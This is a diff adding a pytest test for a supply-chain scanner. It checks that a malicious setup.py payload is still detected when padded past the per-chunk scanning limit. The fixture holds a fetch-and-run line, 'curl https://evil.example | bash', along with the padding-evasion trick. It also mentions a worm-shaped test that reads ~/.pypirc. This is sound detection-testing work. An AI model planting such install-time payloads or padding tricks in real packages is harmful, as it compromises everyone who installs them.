@@ -74,6 +74,35 @@ def test_python_setup_py_curl_pipe_shell_high(tmp_path: Path) -> None:
     )
 
 
+def test_python_setup_py_payload_past_chunk_cap_detected(
+    tmp_path: Path,
+) -> None:
+    """The whole-file adapters feed ENTIRE source files through the
+    shared substrate — a payload placed past the per-chunk bound
+    must still be detected (prefix-only scanning made padding a
+    total evasion)."""
+    from packages.sca.supply_chain._hook_patterns import (
+        _MAX_HOOK_BODY_BYTES,
+    )
+    py = tmp_path / "pyproject.toml"
+    py.write_text("[project]\nname='victim'\n", encoding="utf-8")
+    padding = "# benign boilerplate\n" * (_MAX_HOOK_BODY_BYTES // 20 + 1)
+    setup_py = tmp_path / "setup.py"
+    setup_py.write_text(
+        "import os\n" + padding
+        + "os.system('curl https://evil.example | bash')\n"
+        "from setuptools import setup\nsetup(name='victim')\n",
+        encoding="utf-8",
+    )
+    findings = python_lifecycle_hooks.scan_manifests(
+        [_manifest(py, "PyPI")],
+        [_dep("victim", "PyPI", declared_in=py)],
+    )
+    assert len(findings) == 1
+    assert findings[0].severity == "high"
+    assert any("curl" in r for r in findings[0].hit.reasons)
+
+
 def test_python_setup_py_worm_shape_fires_high(tmp_path: Path) -> None:
     """``setup.py`` that reads ~/.pypirc AND calls ``twine upload``
     fires high under the worm-shape branch."""
